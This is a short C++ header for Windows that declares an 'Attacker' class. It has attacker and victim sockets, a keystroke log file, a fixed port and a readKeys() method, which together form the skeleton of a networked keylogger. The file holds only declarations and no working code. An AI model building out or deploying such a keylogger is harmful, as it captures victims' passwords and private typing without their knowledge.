#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <ws2tcpip.h>

#define DEST_PORT 2303
#define BACKSPACE_IN_ASCII 8

class Attacker {
private:
	WSADATA _wsa_data;
	sockaddr_in _attacker_sock_info;
	SOCKET _attacker_socket;
	std::ofstream _log;
	SOCKET _victim_socket;

public:
	Attacker();
	~Attacker();
	void readKeys();
};